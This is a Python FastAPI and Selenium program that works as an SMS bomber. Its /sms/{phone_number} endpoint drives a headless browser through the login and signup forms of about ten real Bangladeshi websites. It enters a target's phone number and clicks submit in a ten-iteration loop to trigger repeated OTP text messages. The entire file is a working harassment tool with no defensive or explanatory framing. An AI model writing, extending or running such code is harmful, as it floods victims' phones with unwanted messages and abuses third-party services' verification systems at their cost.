from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
import time
import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

app = FastAPI(
    title="sms",
    description="send sms",
    version="1.0.0"
)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=False,
    allow_methods=["GET"],
    allow_headers=["*"],
)


@app.get("/")
def home():
    return {
        "message": "sms api",
        "usage": "/sms/{phone_number}"
    }



options = Options()
options.add_argument("--headless=new")
options.add_argument("--disable-gpu")
options.add_argument("--window-size=1920,1080")

driver = webdriver.Chrome(options=options)

def send_sms_default(site_info):
    try:
        driver.get(site_info["url"])
        wait = WebDriverWait(driver, 10)

        selectors = {
            "css_selector": By.CSS_SELECTOR,
            "xpath": By.XPATH,
        }
        for subprocess in site_info["process"]:
            if subprocess["type"] == "click":
                wait.until(
                    EC.element_to_be_clickable((
                        selectors[subprocess["selector"]["type"]],
                        subprocess["selector"]["value"]
                    ))
                ).click()
            elif subprocess["type"] == "input":
                if subprocess["input"]["type"] == "text":
                    wait.until(
                        EC.visibility_of_element_located((
                            selectors[subprocess["selector"]["type"]],
                            subprocess["selector"]["value"]
                        ))
                    ).send_keys(subprocess["input"]["value"])
        
        return {
            "status": "OK",
        }
    except Exception as e:
        return {
            "status": "Error",
            "messege": e,
        }



@app.get("/sms/{phone_number}")
def sms(phone_number):
    sites=[
        {
            'url': 'https://www.dncrp.com/auth/registration','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '/html/body/div/div/form/div[1]/div/div[2]/input'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '/html/body/div/div/form/div[2]/div/button'}},
            ],
        },
        {
            'url': 'https://www.rokomari.com/login','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="emailOrPhone"]'}, 'input': {'type': 'text', 'value': phone_number[4:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="rokomariBody"]/div[5]/div/form/button'}},
            ],
        },
        {
            'url': 'https://my.karbarapp.com/login','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id=":Rlkpl6:-form-item"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="__next"]/div/div[1]/div/section/div[1]/div/div[2]/div[2]/form/button'}},
            ],
        },
        {
            'url': 'https://mojaru.com/en/login','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//input[@id="mobile_or_email" and @name="mobile_or_email"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '/html/body/div[1]/main/div/section/div/div[1]/div/form/button'}},
            ],
        },
        {
            'url': 'https://shadhinmusic.com/login','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="zoom-root"]/div[1]/div/div[2]/main/div/div/button[1]/div/p'}},
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="radix-_R_bav5uiu9hdbH2_"]/div/div/div/div/input'}, 'input': {'type': 'text', 'value': phone_number[4:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="radix-_R_bav5uiu9hdbH2_"]/div/button'}},
            ],
        },
        {
            'url': 'https://trucklagbe.com/site/login','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '/html/body/app-root/div/div/app-login/div/div/div/div[1]/app-mobile-number-form/div/div/div[1]/nz-input-group/input'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '/html/body/app-root/div/div/app-login/div/div/div/div[1]/app-mobile-number-form/div/div/button'}},
            ],
        },
        {
            'url': 'https://www.focusonlinebd.com/signup','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="phone"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '/html/body/div[2]/main/section/div[2]/div/div/div/div[2]/div/div/form/button'}},
            ],
        },
        {
            'url': 'https://expresshub.com.bd/','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '/html/body/main/header/div/div[1]/div/div[2]/a[2]/div[1]/i'}},
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="PhoneNumber"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="CheckUserBtn"]'}},
            ],
        },
        {
            'url': 'https://livemcq.com/login/','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="mobileInput"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="submitBtn"]'}},
            ],
        },
        {
            'url': 'https://go.paperfly.com.bd/identity/register','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="register-full-name"]'}, 'input': {'type': 'text', 'value': 'User'}},
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="register-company"]'}, 'input': {'type': 'text', 'value': 'Shop'}},
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="register-phone"]'}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'input', 'selector': {'type': 'xpath', 'value': '//*[@id="register-email"]'}, 'input': {'type': 'text', 'value': 'user@example.com'}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': '//*[@id="app"]/div/div[3]/div[2]/form/button'}},
            ],
        },
        {
            'url': 'url','status': 'OK','resend time': 0,'function': send_sms_default,
            'process': [
                {'type': 'input', 'selector': {'type': 'xpath', 'value': ''}, 'input': {'type': 'text', 'value': phone_number[3:]}},
                {'type': 'click', 'selector': {'type': 'xpath', 'value': ''}},
            ],
        },

    ]
    total_sites=len(sites)-1
    for j in range(10):
        i = j%total_sites
        sites[i]["function"](sites[i])
    
    return {
        "phone_number": phone_number,
        "status": "OK"
    }
